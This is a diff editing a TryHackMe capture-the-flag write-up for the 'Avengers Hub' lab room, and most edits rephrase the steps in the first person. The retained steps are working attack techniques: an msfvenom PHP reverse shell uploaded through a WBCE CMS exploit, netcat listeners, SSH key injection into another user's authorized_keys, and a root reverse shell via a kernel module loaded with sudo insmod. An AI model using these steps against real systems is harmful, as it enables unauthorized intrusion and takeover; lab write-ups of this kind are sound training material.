@@ -1,5 +1,6 @@
 # 🛡️ Hello guys, welcome to this THM *Avengers Hub* write-up!
 
+**happy hacking!**
 ---
 
 ## 🧭 Step 0 – Preparation
@@ -80,30 +81,29 @@ https://www.exploit-db.com/exploits/52039
 
 ## 🐚 Step 6 – Reverse Shell via WBCE CMS Exploit
 
-Generate a PHP reverse shell in `.inc` format:
+We gonna Generate a PHP reverse shell in `.inc` format:
 
 ```bash
 msfvenom -p php/reverse_php LHOST=10.20.20.20 LPORT=4444 -f raw > shell.inc
 ```
 
-Set up a listener:
+We set up a listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Upload `shell.inc` to `/media/` in the CMS and trigger it in the browser.
+Uploading `shell.inc` to `/media/` in the CMS and trigger it in the browser.
 
-🎉 You now have a shell as `www-data`.
+🎉 We now have a shell as `www-data`.
 
 ---
 
 ## 🧍‍♂️ Step 7 – Privilege Escalation to User
 
-Check who you are:
-
+Checking the privileges we currently have on the system
 ```bash
-whoami
+id
 ```
 
 Then look for users:
@@ -112,20 +112,20 @@ Then look for users:
 ls /home/
 ```
 
-Suppose we find the user `void` and the folder `/home/void/.ssh/` is **writable**.
+We found the user `void` and the folder `/home/void/.ssh/` is **writable**.
 
 ---
 
 ## 🔑 Step 8 – SSH Key Injection
 
-On your machine, generate a key:
+On our machine we generate an ssh public key:
 
 ```bash
 ssh-keygen -t rsa -b 4096 -f mykey
 cat mykey.pub
 ```
 
-Copy the content and inject it into the target:
+We then copy the content and inject it into the target:
 
 ```bash
 echo "PASTE_YOUR_SSH_PUBLIC_KEY_HERE" > /home/void/.ssh/authorized_keys
@@ -147,21 +147,22 @@ cat /home/void/flag.txt
 
 ## 👑 Step 9 – Escalating to Root with a Kernel Module
 
-Check what we can do with sudo:
+when we check what we can do with sudo:
 
 ```bash
 sudo -l
 ```
 
 We see permission to run `/sbin/insmod`, which loads a `.ko` kernel module.
+> `.ko` files are **Linux kernel modules** — they are pieces of code that can be dynamically loaded into the Linux kernel to add or extend functionality (like drivers, features, or system-level behaviors).
 
-> ⚠️ Important: The target machine already has `make` and kernel headers, so we’ll compile the module **directly on the target**.
+The target machine already has `make` and kernel headers, so we’ll compile the module **directly on the target**.
 
 ---
 
 ## 🛠️ Step 10 – Creating the Kernel Module on the Target
 
-### On the target, create `cyberavengers.c`:
+### On the target, we create `cyberavengers.c`:
 
 ```c
 #include <linux/module.h>
@@ -205,7 +206,7 @@ MODULE_DESCRIPTION("Kernel module reverse shell");
 
 ---
 
-### Still on the target, create `Makefile`:
+### Still on the target, we create `Makefile`:
 
 ```makefile
 obj-m += cyberavengers.o
@@ -227,7 +228,7 @@ clean:
 make
 ```
 
-### Set up a listener on your attacker machine:
+### Set up a listener on our attacker machine:
 
 ```bash
 nc -lvnp 8888
@@ -239,7 +240,7 @@ nc -lvnp 8888
 sudo /sbin/insmod cyberavengers.ko
 ```
 
-🎉 You should now have a **root reverse shell** on your listener!
+🎉 we now have a **root reverse shell** on our listener!
 
 ---
 
@@ -253,4 +254,3 @@ cat /root/flag.txt
 
 ## ✅ Challenge Complete
 
-🔥 **Great job and happy hacking!**
